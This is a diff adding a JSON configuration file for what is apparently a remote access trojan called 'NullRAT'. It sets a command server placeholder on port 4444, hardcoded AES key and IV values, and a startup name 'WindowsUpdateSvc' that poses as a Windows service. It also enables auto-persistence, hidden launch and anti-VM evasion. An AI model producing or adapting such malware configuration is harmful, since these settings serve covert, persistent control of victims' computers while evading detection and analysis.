@@ -1,0 +1,21 @@
+{
+  "Server": {
+    "Host": "127.0.0.1", // Change to your host
+    "Port": 4444
+  },
+  "Encryption": {
+    "AESKey": "NullRAT_16ByteKey!",
+    "AESIV": "NullRAT_16ByteIV!!"
+  },
+  "Client": {
+    "Mutex": "NullRAT_SingleInstance",
+    "StartupName": "WindowsUpdateSvc",
+    "AutoPersist": true
+  },
+  "Behavior": {
+    "ReconnectDelayMs": 5000,
+    "HeartbeatMs": 10000,
+    "StartHidden": true,
+    "AntiVM": true
+  }
+}
